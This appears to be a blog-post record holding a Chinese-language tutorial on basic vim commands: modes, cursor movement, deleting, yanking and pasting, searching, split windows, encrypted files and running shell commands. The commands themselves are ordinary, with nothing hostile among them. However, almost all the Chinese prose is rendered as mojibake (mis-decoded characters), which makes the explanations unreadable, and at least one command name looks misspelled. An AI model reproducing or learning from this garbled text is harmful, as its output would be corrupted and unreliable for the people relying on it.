    <title><![CDATA[vimåŸºæœ¬å‘½ä»¤]]></title>
    <url>%2Fposts%2F17b23787%2F</url>
    <content type="text"><![CDATA[ä¸‰ç§æ¨¡å¼: ä¸€èˆ¬å‘½ä»¤æ¨¡å¼(é»˜è®¤,æŒ‰ä½escè¿›å…¥) å‘½ä»¤æ¨¡å¼ ç¼–è¾‘æ¨¡å¼ h å·¦ j ä¸‹ l å³ k ä¸Š w ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå•è¯è¯é¦– e ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå•è¯è¯å°¾ b ç§»åŠ¨åˆ°ä¸Šä¸€ä¸ªå•è¯è¯é¦– 2.è¿›å…¥æ’å…¥æ¨¡å¼ i åœ¨å½“å‰å…‰æ ‡å‡ºå¤„ç¼–è¾‘ I å¤§å†™çš„i åœ¨è¡Œé¦–æ’å…¥ A åœ¨è¡Œæœ«æ’å…¥ a åœ¨å…‰æ ‡åæ’å…¥ç¼–è¾‘ o åœ¨å½“å‰è¡Œåæ’å…¥ä¸€ä¸ªæ–°è¡Œ O åœ¨å½“å‰è¡Œå‰æ’å…¥ä¸€ä¸ªæ–°è¡Œ cw æ›¿æ¢ä»å…‰æ ‡æ‰€åœ¨ä½ç½®ååˆ°ä¸€ä¸ªå•è¯ç»“å°¾çš„å­—ç¬¦ 3.1å‘½ä»¤è¡Œæ¨¡å¼ä¸‹é€€å‡ºvim å‘½ä»¤ è¯´æ˜ :q! å¼ºåˆ¶é€€å‡ºï¼Œä¸ä¿å­˜ :q é€€å‡º :wq! å¼ºåˆ¶ä¿å­˜å¹¶é€€å‡º :w &lt;æ–‡ä»¶è·¯å¾„&gt; å¦å­˜ä¸º :saveas æ–‡ä»¶è·¯å¾„ å¦å­˜ä¸º :x ä¿å­˜å¹¶é€€å‡º :wq ä¿å­˜å¹¶é€€å‡º 3.2æ™®é€šæ¨¡å¼ä¸‹é€€å‡ºvimæ™®é€šæ¨¡å¼ä¸‹è¾“å…¥Shift+zzå³å¯ä¿å­˜é€€å‡ºvim 4. æ™®é€šæ¨¡å¼ä¸‹åˆ é™¤vimæ–‡æœ¬ä¿¡æ¯è¿›å…¥æ™®é€šæ¨¡å¼ï¼Œä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥è¿›è¡Œæ–‡æœ¬å¿«é€Ÿåˆ é™¤ï¼š å‘½ä»¤ è¯´æ˜ x åˆ é™¤æ¸¸æ ‡æ‰€åœ¨çš„å­—ç¬¦ X åˆ é™¤æ¸¸æ ‡æ‰€åœ¨å‰ä¸€ä¸ªå­—ç¬¦ Delete åŒx dd åˆ é™¤æ•´è¡Œ dw åˆ é™¤ä¸€ä¸ªå•è¯ï¼ˆä¸é€‚ç”¨ä¸­æ–‡ï¼‰ d$æˆ–D åˆ é™¤è‡³è¡Œå°¾ d^ åˆ é™¤è‡³è¡Œé¦– dG åˆ é™¤åˆ°æ–‡æ¡£ç»“å°¾å¤„ d1G åˆ è‡³æ–‡æ¡£é¦–éƒ¨ é™¤æ­¤ä¹‹å¤–ï¼Œä½ è¿˜å¯ä»¥åœ¨å‘½ä»¤ä¹‹å‰åŠ ä¸Šæ•°å­—ï¼Œè¡¨ç¤ºä¸€æ¬¡åˆ é™¤å¤šè¡Œï¼Œå¦‚ï¼š 2ddè¡¨ç¤ºä¸€æ¬¡åˆ é™¤2è¡Œ 2.1.1 é‡å¤æ‰§è¡Œä¸Šæ¬¡å‘½ä»¤åœ¨æ™®é€šæ¨¡å¼ä¸‹.(å°æ•°ç‚¹)è¡¨ç¤ºé‡å¤ä¸Šä¸€æ¬¡çš„å‘½ä»¤æ“ä½œ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥xï¼Œåˆ é™¤ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œè¾“å…¥.(å°æ•°ç‚¹)ä¼šå†æ¬¡åˆ é™¤ä¸€ä¸ªå­—ç¬¦ï¼Œé™¤æ­¤ä¹‹å¤–ä¹Ÿå¯ä»¥é‡å¤ddçš„åˆ é™¤æ“ä½œ 2.1.2 æ‰§è¡ŒæŒ‡å®šæ¬¡æ•°ç›¸åŒçš„å‘½ä»¤è¿›å…¥æ™®é€šæ¨¡å¼è¾“å…¥N&lt;command&gt;ï¼ŒN è¡¨ç¤ºé‡å¤åé¢çš„æ¬¡æ•°ï¼Œä¸‹é¢æ¥ç»ƒä¹ ï¼š æ‰“å¼€æ–‡ä»¶æ–‡ä»¶è¿›è¡Œç¼–è¾‘ $ vim protocols ä¸‹é¢ä½ å¯ä»¥ä¾æ¬¡è¿›è¡Œå¦‚ä¸‹æ“ä½œç»ƒä¹ ï¼š è¾“å…¥10xï¼Œåˆ é™¤10ä¸ªè¿ç»­å­—ç¬¦ è¾“å…¥3ddï¼Œå°†ä¼šåˆ é™¤3è¡Œæ–‡æœ¬ åœ¨æ™®é€šæ¨¡å¼ä¸‹ï¼Œä½ è¿˜å¯ä»¥ä½¿ç”¨dwæˆ–è€…daw(delete a word)åˆ é™¤ä¸€ä¸ªå•è¯ï¼Œæ‰€ä»¥ä½ å¯ä»¥å¾ˆå®¹æ˜“çš„è”æƒ³åˆ°dnw(næ›¿æ¢ä¸ºç›¸åº”æ•°å­—) è¡¨ç¤ºåˆ é™¤nä¸ªå•è¯ 2.2.1 è¡Œé—´è·³è½¬ å‘½ä»¤ è¯´æ˜ nG(n Shift+g) æ¸¸æ ‡ç§»åŠ¨åˆ°ç¬¬ n è¡Œ(å¦‚æœé»˜è®¤æ²¡æœ‰æ˜¾ç¤ºè¡Œå·ï¼Œè¯·å…ˆè¿›å…¥å‘½ä»¤æ¨¡å¼ï¼Œè¾“å…¥:set nuä»¥æ˜¾ç¤ºè¡Œå·) gg æ¸¸æ ‡ç§»åŠ¨åˆ°åˆ°ç¬¬ä¸€è¡Œ G(Shift+g) åˆ°æœ€åä¸€è¡Œ ä½ åœ¨å®Œæˆä¾æ¬¡è·³è½¬åï¼Œå¯ä»¥ä½¿ç”¨ Ctrl+o å¿«é€Ÿå›åˆ°ä¸Šä¸€æ¬¡(è·³è½¬å‰)å…‰æ ‡æ‰€åœ¨ä½ç½®,è¿™ä¸ªæŠ€å·§å¾ˆå®ç”¨ï¼Œæ¯”å¦‚å½“ä½ åœ¨å†™ä»£ç æ—¶ï¼Œå¿½ç„¶æƒ³èµ·æœ‰ä¸ª bugï¼Œéœ€è¦ä¿®æ”¹ï¼Œè¿™æ—¶å€™ä½ è·³è¿‡å»æ”¹å¥½äº†ï¼Œåªéœ€è¦æŒ‰ä¸‹ Ctrl+o å°±å¯ä»¥å›åˆ°ä½ ä¹‹å‰çš„ä½ç½®ã€‚vim ä¸­ä¼šç”¨å¾ˆå¤šç±»ä¼¼çš„å°æŠ€å·§å°±ç­‰ç€ä½ å»å‘æ˜ã€‚ 2.2.2 è¡Œå†…è·³è½¬æ™®é€šæ¨¡å¼ä¸‹ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤åœ¨è¡Œå†…æŒ‰ç…§å•è¯ä¸ºå•ä½è¿›è¡Œè·³è½¬ å‘½ä»¤ è¯´æ˜ w åˆ°ä¸‹ä¸€ä¸ªå•è¯çš„å¼€å¤´ e åˆ°å½“å‰å•è¯çš„ç»“å°¾ b åˆ°å‰ä¸€ä¸ªå•è¯çš„å¼€å¤´ ge åˆ°å‰ä¸€ä¸ªå•è¯çš„ç»“å°¾ 0æˆ–^ åˆ°è¡Œå¤´ $ åˆ°è¡Œå°¾ f&lt;å­—æ¯&gt; å‘åæœç´¢&lt;å­—æ¯&gt;å¹¶è·³è½¬åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„ä½ç½®(éå¸¸å®ç”¨) F&lt;å­—æ¯&gt; å‘å‰æœç´¢&lt;å­—æ¯&gt;å¹¶è·³è½¬åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…çš„ä½ç½® t&lt;å­—æ¯&gt; å‘åæœç´¢&lt;å­—æ¯&gt;å¹¶è·³è½¬åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ä½ç½®ä¹‹å‰çš„ä¸€ä¸ªå­—æ¯(ä¸å¸¸ç”¨) T&lt;å­—æ¯&gt; å‘å‰æœç´¢&lt;å­—æ¯&gt;å¹¶è·³è½¬åˆ°ç¬¬ä¸€ä¸ªåŒ¹é…ä½ç½®ä¹‹åçš„ä¸€ä¸ªå­—æ¯(ä¸å¸¸ç”¨) ä½¿ç”¨ ~ å°†æ¸¸æ ‡æ‰€åœ¨å­—æ¯å˜æˆå¤§å†™æˆ–å°å†™ 2.3.1 å¤åˆ¶åŠç²˜è´´æ–‡æœ¬ æ™®é€šæ¨¡å¼ä¸­ä½¿ç”¨yå¤åˆ¶ æ™®é€šæ¨¡å¼ä¸­ï¼Œyyå¤åˆ¶æ¸¸æ ‡æ‰€åœ¨çš„æ•´è¡Œï¼ˆ3yyè¡¨ç¤ºå¤åˆ¶3è¡Œï¼‰ æ™®é€šæ¨¡å¼ä¸­ï¼Œy^ å¤åˆ¶è‡³è¡Œé¦–ï¼Œæˆ–y0ã€‚ä¸å«å…‰æ ‡æ‰€åœ¨å¤„å­—ç¬¦ã€‚ æ™®é€šæ¨¡å¼ä¸­ï¼Œy$ å¤åˆ¶è‡³è¡Œå°¾ã€‚å«å…‰æ ‡æ‰€åœ¨å¤„å­—ç¬¦ã€‚ æ™®é€šæ¨¡å¼ä¸­ï¼Œyw å¤åˆ¶ä¸€ä¸ªå•è¯ã€‚ æ™®é€šæ¨¡å¼ä¸­ï¼Œy2w å¤åˆ¶ä¸¤ä¸ªå•è¯ã€‚ æ™®é€šæ¨¡å¼ä¸­ï¼ŒyG å¤åˆ¶è‡³æ–‡æœ¬æœ«ã€‚ æ™®é€šæ¨¡å¼ä¸­ï¼Œy1G å¤åˆ¶è‡³æ–‡æœ¬å¼€å¤´ã€‚ æ™®é€šæ¨¡å¼ä¸­ä½¿ç”¨ p ç²˜è´´ æ™®é€šæ¨¡å¼ä¸­ï¼Œp(å°å†™)ä»£è¡¨ç²˜è´´è‡³å…‰æ ‡åï¼ˆä¸‹ï¼‰ æ™®é€šæ¨¡å¼ä¸­ï¼ŒP(å¤§å†™)ä»£è¡¨ç²˜è´´è‡³å…‰æ ‡å‰ï¼ˆä¸Šï¼‰ 2.3.2 å‰ªåˆ‡åŠç²˜è´´å…¶å®å‰é¢è®²å¾— dd åˆ é™¤å‘½ä»¤å°±æ˜¯å‰ªåˆ‡ï¼Œä½ æ¯æ¬¡ dd åˆ é™¤æ–‡æ¡£å†…å®¹åï¼Œä¾¿å¯ä»¥ä½¿ç”¨ p æ¥ç²˜è´´ï¼Œä¹Ÿè¿™ä¸€ç‚¹å¯ä»¥è®©æˆ‘ä»¬å®ç°ä¸€ä¸ªå¾ˆçˆ½å¿«çš„åŠŸèƒ½â€”â€”äº¤æ¢ä¸Šä¸‹è¡Œï¼š ddp ,å°±è¿™ä¹ˆç®€å•ï¼Œå³å®ç°äº†å¿«é€Ÿäº¤æ¢å…‰æ ‡æ‰€åœ¨è¡Œä¸å®ƒä¸‹é¢çš„è¡Œ 2.1.1 æ›¿æ¢å’Œæ’¤é”€(Undo)å‘½ä»¤æ›¿æ¢å’ŒUndoå‘½ä»¤éƒ½æ˜¯é’ˆå¯¹æ™®é€šæ¨¡å¼ä¸‹çš„æ“ä½œ å‘½ä»¤ è¯´æ˜ r+&lt;å¾…æ›¿æ¢å­—æ¯&gt; å°†æ¸¸æ ‡æ‰€åœ¨å­—æ¯æ›¿æ¢ä¸ºæŒ‡å®šå­—æ¯ R è¿ç»­æ›¿æ¢ï¼Œç›´åˆ°æŒ‰ä¸‹Esc cc æ›¿æ¢æ•´è¡Œï¼Œå³åˆ é™¤æ¸¸æ ‡æ‰€åœ¨è¡Œï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ cw æ›¿æ¢ä¸€ä¸ªå•è¯ï¼Œå³åˆ é™¤ä¸€ä¸ªå•è¯ï¼Œå¹¶è¿›å…¥æ’å…¥æ¨¡å¼ C(å¤§å†™) æ›¿æ¢æ¸¸æ ‡ä»¥åè‡³è¡Œæœ« ~ åè½¬æ¸¸æ ‡æ‰€åœ¨å­—æ¯å¤§å°å†™ u{n} æ’¤é”€ä¸€æ¬¡æˆ–næ¬¡æ“ä½œ U(å¤§å†™) æ’¤é”€å½“å‰è¡Œçš„æ‰€æœ‰ä¿®æ”¹ Ctrl+r redoï¼Œå³æ’¤é”€undoçš„æ“ä½œ è¾“å…¥2Gï¼Œè·³è½¬åˆ° 2 è¡Œ 2.2.1 ä½¿ç”¨å‘½ä»¤è¿›è¡Œå¿«é€Ÿè°ƒæ•´ç¼©è¿›æ“ä½œè¿™ä¸€å°èŠ‚å­¦ä¹ å¦‚ä½•åœ¨vimä¸­è¿›è¡Œå¿«é€Ÿç¼©è¿›ï¼Œç¼©è¿›æ“ä½œå‡åœ¨æ™®é€šæ¨¡å¼ä¸‹æœ‰æ•ˆ æ‰“å¼€æ–‡ä»¶è¿›è¡Œç¼–è¾‘ $ vim protocols æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥15Gï¼Œè·³è½¬åˆ°15è¡Œ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥&gt;&gt; æ•´è¡Œå°†å‘å³ç¼©è¿›ï¼ˆä½¿ç”¨ï¼Œç”¨äºæ ¼å¼åŒ–ä»£ç è¶…çˆ½ï¼‰ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥&lt;&lt; æ•´è¡Œå‘å·¦å›é€€ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥:è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ä¸‹å¯¹shiftwidthå€¼è¿›è¡Œè®¾ç½®å¯ä»¥æ§åˆ¶ç¼©è¿›å’Œå›é€€çš„å­—ç¬¦æ•° 2.2.2 shiftwidthå‘½ä»¤shiftwidthå‘½ä»¤æ˜¯æŒ‡ä¸Šä¸€èŠ‚&gt;&gt;å‘½ä»¤äº§ç”Ÿçš„ç¼©è¿›ï¼ˆå¯ä»¥ç®€å†™æˆswï¼‰ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥:è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ä¸‹å¯¹shiftwidthå€¼è¿›è¡Œè®¾ç½®å¯ä»¥æ§åˆ¶ç¼©è¿›å’Œå›é€€çš„å­—ç¬¦æ•° è·å–ç›®å‰çš„è®¾å®šå€¼ :set shiftwidth? è®¾ç½®ç¼©è¿›ä¸º10ä¸ªå­—ç¬¦ :set shiftwidth=10 è¾“å…¥ ESC å›åˆ°æ™®é€šæ¨¡å¼ï¼Œå†æ¬¡å°è¯• &gt;&gt; çœ‹ç¼©è¿›é‡æ˜¯å¦å˜åŒ– 2.2.3 è°ƒæ•´æ–‡æœ¬ä½ç½®å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:ce(center)å‘½ä»¤ä½¿æœ¬è¡Œå†…å®¹å±…ä¸­ :ce å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:ri(right)å‘½ä»¤ä½¿æœ¬è¡Œæ–‡æœ¬é å³ :ri å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:le(left)å‘½ä»¤ä½¿æœ¬è¡Œå†…å®¹é å·¦ :le 2.3.1 å¿«é€ŸæŸ¥æ‰¾æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥ / ç„¶åé”®å…¥éœ€è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸² æŒ‰å›è½¦åå°±ä¼šè¿›è¡ŒæŸ¥æ‰¾ã€‚ï¼Ÿ ä¸/ åŠŸèƒ½ç›¸åŒï¼Œåªä¸è¿‡ ï¼Ÿ æ˜¯å‘ä¸Šè€Œ / æ˜¯å‘ä¸‹æŸ¥æ‰¾ã€‚ è¿›å…¥æŸ¥æ‰¾ä¹‹åï¼Œè¾“å…¥n å’Œ N å¯ä»¥ç»§ç»­æŸ¥æ‰¾ nè¡¨ç¤ºç»§ç»­æŸ¥æ‰¾ï¼ŒN åå‘æŸ¥æ‰¾ 2.3.2 å¿«é€ŸæŸ¥æ‰¾ç»ƒä¹ ä½¿ç”¨ vim æ‰“å¼€æ–‡ä»¶è¿›è¡Œç¼–è¾‘ï¼ˆæœç´¢é«˜äº®éœ€è¦åœ¨é…ç½®æ–‡ä»¶ .vimrc ä¸­è®¾ç½® set hls ï¼Œå®éªŒç¯å¢ƒä¸­å·²ç»è®¾ç½®å¥½äº†ï¼‰ $ vim protocols æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥/icmpç„¶åå›è½¦å³å¯æŸ¥æ‰¾å­—ç¬¦ä¸² icmp æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥næŸ¥æ‰¾ä¸‹ä¸€ä¸ª icmp æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥ï¼Ÿtcpå‘ä¸ŠæŸ¥æ‰¾å­—ç¬¦ä¸² tcp æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥NæŸ¥æ‰¾ä¸Šä¸€ä¸ªå‡ºç°çš„ tcp å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥ noh ç„¶åå›è½¦å³å¯å–æ¶ˆæœç´¢ 2.3.3 é«˜çº§æŸ¥æ‰¾ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥\*å¯»æ‰¾æ¸¸æ ‡æ‰€åœ¨å¤„çš„å•è¯ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥\#åŒä¸Šï¼Œä½† \# æ˜¯å‘å‰ï¼ˆä¸Šï¼‰æ‰¾ï¼Œ\*åˆ™æ˜¯å‘åï¼ˆä¸‹ï¼‰æ‰¾ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥g\*åŒ\* ï¼Œä½†éƒ¨åˆ†ç¬¦åˆè¯¥å•è¯å³å¯ æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥g\#åŒ\# ï¼Œä½†éƒ¨åˆ†ç¬¦åˆè¯¥å•è¯å³å¯ ä»¥ä¸ŠæŸ¥æ‰¾n,N çš„ç»§ç»­æŸ¥æ‰¾å‘½ä»¤ä¾ç„¶å¯ä»¥ç”¨ 2.1.1 ä½¿ç”¨vimç¼–è¾‘å¤šä¸ªæ–‡ä»¶ç¼–è¾‘å¤šä¸ªæ–‡ä»¶æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ç§æ˜¯åœ¨è¿›å…¥vimå‰ä½¿ç”¨çš„å‚æ•°å°±æ˜¯å¤šä¸ªæ–‡ä»¶ã€‚å¦ä¸€ç§å°±æ˜¯è¿›å…¥vimåå†ç¼–è¾‘å…¶ä»–çš„æ–‡ä»¶ã€‚ åŒæ—¶åˆ›å»ºä¸¤ä¸ªæ–°æ–‡ä»¶å¹¶ç¼–è¾‘ $ vim 1.txt 2.txt é»˜è®¤è¿›å…¥1.txtæ–‡ä»¶çš„ç¼–è¾‘ç•Œé¢ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥ :n ç¼–è¾‘ 2.txt æ–‡ä»¶ï¼Œå¯ä»¥åŠ  ! å³ :n! å¼ºåˆ¶åˆ‡æ¢ï¼Œä¹‹å‰ä¸€ä¸ªæ–‡ä»¶çš„è¾“å…¥æ²¡æœ‰ä¿å­˜ï¼Œä»…ä»…åˆ‡æ¢åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥ :N ç¼–è¾‘ 1.txt æ–‡ä»¶ï¼Œå¯ä»¥åŠ  ! å³ :N! å¼ºåˆ¶åˆ‡æ¢ï¼Œä¹‹å‰æ–‡ä»¶å†…çš„è¾“å…¥æ²¡æœ‰ä¿å­˜ï¼Œä»…ä»…æ˜¯åˆ‡æ¢åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ 2.1.2 è¿›å…¥vimåæ‰“å¼€æ–°æ–‡ä»¶ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:e 3.txt æ‰“å¼€æ–°æ–‡ä»¶3.txt å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:e# å›åˆ°å‰ä¸€ä¸ªæ–‡ä»¶ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:lså¯ä»¥åˆ—å‡ºä»¥å‰ç¼–è¾‘è¿‡çš„æ–‡æ¡£ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:b 2.txtï¼ˆæˆ–è€…ç¼–å·ï¼‰å¯ä»¥ç›´æ¥è¿›å…¥æ–‡ä»¶2.txtç¼–è¾‘ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:bd 2.txtï¼ˆæˆ–è€…ç¼–å·ï¼‰å¯ä»¥åˆ é™¤ä»¥å‰ç¼–è¾‘è¿‡çš„åˆ—è¡¨ä¸­çš„æ–‡ä»¶é¡¹ç›® å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:e! 4.txtï¼Œæ–°æ‰“å¼€æ–‡ä»¶4.txtï¼Œæ”¾å¼ƒæ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:f æ˜¾ç¤ºæ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶å å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:f new.txtï¼Œæ”¹å˜æ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶åå­—ä¸ºnew.txt 2.1.3 æ¢å¤æ–‡ä»¶ ç”±äºåœ¨çº¿ç¯å¢ƒçš„ç‰¹æ®Šæ€§ï¼Œè¯·åœ¨æœ¬æœºå°è¯• å¦‚æœå› ä¸ºæ–­ç”µç­‰åŸå› é€ æˆæ–‡æ¡£æ²¡æœ‰ä¿å­˜ï¼Œå¯ä»¥é‡‡ç”¨æ¢å¤æ–¹å¼ï¼Œvim -rè¿›å…¥æ–‡æ¡£åï¼Œè¾“å…¥:ewcover 1.txtæ¥æ¢å¤ $ vim -r 1.txt 2.2.1 å¯è§†æ¨¡å¼å‘½ä»¤ç®€ä»‹ åœ¨æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥ vï¼ˆå°å†™ï¼‰ï¼Œè¿›å…¥å­—ç¬¦é€‰æ‹©æ¨¡å¼ï¼Œå°±å¯ä»¥ç§»åŠ¨å…‰æ ‡ï¼Œå…‰æ ‡èµ°è¿‡çš„åœ°æ–¹å°±ä¼šé€‰å–ã€‚å†æ¬¡æŒ‰ä¸‹vä¼šåå°±ä¼šå–æ¶ˆé€‰å–ã€‚ åœ¨æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥ Shift+vï¼ˆå°å†™ï¼‰ï¼Œè¿›å…¥è¡Œé€‰æ‹©æ¨¡å¼ï¼ŒæŒ‰ä¸‹Vä¹‹åå°±ä¼šæŠŠæ•´è¡Œé€‰å–ï¼Œæ‚¨å¯ä»¥ä¸Šä¸‹ç§»åŠ¨å…‰æ ‡é€‰æ›´å¤šçš„è¡Œï¼ŒåŒæ ·ï¼Œå†æŒ‰ä¸€æ¬¡ Shift+v å°±å¯ä»¥å–æ¶ˆé€‰å–ã€‚ åœ¨æ™®é€šæ¨¡å¼ä¸‹è¾“å…¥ Ctrl+vï¼ˆå°å†™ï¼‰ï¼Œè¿™æ˜¯åŒºåŸŸé€‰æ‹©æ¨¡å¼ï¼Œå¯ä»¥è¿›è¡ŒçŸ©å½¢åŒºåŸŸé€‰æ‹©ï¼Œå†æŒ‰ä¸€æ¬¡ Ctrl+v å–æ¶ˆé€‰å–ã€‚ åœ¨å¯è§†æ¨¡å¼ä¸‹è¾“å…¥ d åˆ é™¤é€‰å–åŒºåŸŸå†…å®¹ åœ¨å¯è§†æ¨¡å¼ä¸‹è¾“å…¥yå¤åˆ¶é€‰å–åŒºåŸŸå†…å®¹ 2.3.1 è§†çª—æ“ä½œç®€ä»‹vim å¯ä»¥åœ¨ä¸€ä¸ªç•Œé¢é‡Œæ‰“å¼€å¤šä¸ªçª—å£è¿›è¡Œç¼–è¾‘ï¼Œè¿™äº›ç¼–è¾‘çª—å£ç§°ä¸º vim çš„è§†çª—ã€‚ æ‰“å¼€æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œä¾‹å¦‚å¯ä»¥ä½¿ç”¨åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥ :new æ‰“å¼€ä¸€ä¸ªæ–°çš„ vim è§†çª—ï¼Œå¹¶è¿›å…¥è§†çª—ç¼–è¾‘ä¸€ä¸ªæ–°æ–‡ä»¶ï¼ˆæ™®é€šæ¨¡å¼ä¸‹è¾“å…¥ Ctrl+wä¹Ÿå¯ä»¥ï¼‰ï¼Œé™¤äº† :new å‘½ä»¤ï¼Œä¸‹è¿°åˆ—ä¸¾çš„å¤šç§æ–¹æ³•ä¹Ÿå¯ä»¥åœ¨å‘½ä»¤æ¨¡å¼æˆ–æ™®é€šæ¨¡å¼ä¸‹æ‰“å¼€æ–°çš„è§†çª—ï¼š æ³¨æ„ï¼šå¿«æ·é”®å¯èƒ½ä¼šä¸æµè§ˆå™¨çš„å¿«æ·é”®å†²çªï¼Œå¯æ¢ä¸º IE æµè§ˆå™¨è¿›è¡Œå®éªŒæˆ–è€…åœ¨æµè§ˆå™¨è®¾ç½®é‡Œç¦ç”¨æµè§ˆå™¨å¿«æ·é”®ã€‚ å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:sp 1.txt æ‰“å¼€æ–°çš„æ°´å¹³åˆ†å±è§†çª—æ¥ç¼–è¾‘1.txt å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:vsp 2.txt æ‰“å¼€æ–°çš„å‚ç›´åˆ†å±è§†çª—æ¥ç¼–è¾‘2.txt æ™®é€šæ¨¡å¼ä¸‹Ctrl+w s å°†å½“å‰çª—å£åˆ†å‰²æˆä¸¤ä¸ªæ°´å¹³çš„çª—å£ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w v å°†å½“å‰çª—å£åˆ†å‰²æˆä¸¤ä¸ªå‚ç›´çš„çª—å£ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w q å³ :q ç»“æŸåˆ†å‰²å‡ºæ¥çš„è§†çª—ã€‚å¦‚æœåœ¨æ–°è§†çª—ä¸­æœ‰è¾“å…¥éœ€è¦ä½¿ç”¨å¼ºåˆ¶ç¬¦ï¼å³:q! æ™®é€šæ¨¡å¼ä¸‹Ctrl+w o æ‰“å¼€ä¸€ä¸ªè§†çª—å¹¶ä¸”éšè—ä¹‹å‰çš„æ‰€æœ‰è§†çª— æ™®é€šæ¨¡å¼ä¸‹Ctrl+w j ç§»è‡³ä¸‹é¢è§†çª— æ™®é€šæ¨¡å¼ä¸‹Ctrl+w k ç§»è‡³ä¸Šé¢è§†çª— æ™®é€šæ¨¡å¼ä¸‹Ctrl+w h ç§»è‡³å·¦è¾¹è§†çª— æ™®é€šæ¨¡å¼ä¸‹Ctrl+w l ç§»è‡³å³è¾¹è§†çª— æ™®é€šæ¨¡å¼ä¸‹Ctrl+w J å°†å½“å‰è§†çª—ç§»è‡³ä¸‹é¢ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w K å°†å½“å‰è§†çª—ç§»è‡³ä¸Šé¢ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w H å°†å½“å‰è§†çª—ç§»è‡³å·¦è¾¹ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w L å°†å½“å‰è§†çª—ç§»è‡³å³è¾¹ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w - å‡å°è§†çª—çš„é«˜åº¦ æ™®é€šæ¨¡å¼ä¸‹Ctrl+w + å¢åŠ è§†çª—çš„é«˜åº¦ 2.4.1 åˆ›å»ºåŠ å¯†æ–‡æ¡£$ vim -x file1 è¾“å…¥æ‚¨çš„å¯†ç  ç¡®è®¤å¯†ç  è¿™æ ·åœ¨ä¸‹ä¸€æ¬¡æ‰“å¼€æ—¶ï¼Œvimå°±ä¼šè¦æ±‚ä½ è¾“å…¥å¯†ç  åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸­è¾“å…¥!å¯ä»¥æ‰§è¡Œå¤–éƒ¨çš„shellå‘½ä»¤ :!ls ç”¨äºæ˜¾ç¤ºå½“å‰ç›®å½•çš„å†…å®¹ :!rm FILENAMEç”¨äºåˆ é™¤åä¸º FILENAME çš„æ–‡ä»¶ :w FILENAMEå¯å°†å½“å‰ VIM ä¸­æ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶å¦å­˜ä¸º FILENAME æ–‡ä»¶ 2.7.1 vimçš„åŠŸèƒ½è®¾å®šå¯ä»¥åœ¨ç¼–è¾‘æ–‡ä»¶çš„æ—¶å€™è¿›è¡ŒåŠŸèƒ½è®¾å®šï¼Œå¦‚å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥:set nuï¼ˆæ˜¾ç¤ºè¡Œæ•°ï¼‰ï¼Œè®¾å®šå€¼é€€å‡ºvimåä¸ä¼šä¿å­˜ã€‚è¦æ°¸ä¹…ä¿å­˜é…ç½®éœ€è¦ä¿®æ”¹vimé…ç½®æ–‡ä»¶ã€‚ 